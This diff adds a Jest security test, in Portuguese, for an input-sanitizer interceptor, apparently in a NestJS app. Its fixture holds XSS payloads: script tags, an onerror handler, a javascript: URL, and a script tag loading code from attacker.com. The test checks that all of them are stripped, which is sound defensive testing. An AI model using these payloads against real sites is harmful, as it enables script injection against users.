@@ -64,3 +64,67 @@ describe('Suite de Testes de Segurança (Zero-Trust JWT Guard)', () => {
     expect(next).toHaveBeenCalled();
   });
 });
+
+import { InputSanitizerInterceptor } from '../common/security/input-sanitizer.interceptor';
+import { of } from 'rxjs';
+
+describe('Suite de Testes de Segurança (Input Sanitizer Interceptor)', () => {
+  let interceptor: InputSanitizerInterceptor;
+
+  beforeEach(() => {
+    interceptor = new InputSanitizerInterceptor();
+  });
+
+  test('XSS-PREVENTION: deve remover tags script e manipuladores de eventos inline de corpos de request', () => {
+    const inputPayload = {
+      name: 'João Silva <script>alert("xss")</script>',
+      description: 'Advogado Sênior',
+      nested: {
+        attack: 'Clique aqui <img src="x" onerror="console.log(1)"> para assinar',
+        url: 'javascript:alert(123)',
+      },
+      arrayField: [
+        'Normal text',
+        'Insecure <script src="http://attacker.com/malicious.js"></script> text',
+      ],
+      numberField: 42,
+    };
+
+    // 🔒 SEGURANÇA: Cria uma referência de request estável para o Mock do Express
+    const mockRequest = {
+      body: inputPayload,
+    };
+
+    const mockExecutionContext: any = {
+      switchToHttp: () => ({
+        getRequest: () => mockRequest,
+      }),
+    };
+
+    const mockCallHandler = {
+      handle: () => of(null),
+    };
+
+    // Executa a interceptação de forma síncrona
+    interceptor.intercept(mockExecutionContext, mockCallHandler);
+
+    const body = mockRequest.body;
+    
+    // Assegura remoção de tags <script>
+    expect(body.name).toBe('João Silva ');
+    expect(body.description).toBe('Advogado Sênior');
+    
+    // Assegura remoção de manipuladores inline no nested object
+    expect(body.nested.attack).toBe('Clique aqui <img src="x" > para assinar');
+    
+    // Assegura remoção do protocolo javascript:
+    expect(body.nested.url).toBe('');
+    
+    // Assegura remoção em campos de Array
+    expect(body.arrayField[0]).toBe('Normal text');
+    expect(body.arrayField[1]).toBe('Insecure  text');
+    
+    // Assegura que campos não-string (como números) permaneçam intactos
+    expect(body.numberField).toBe(42);
+  });
+});
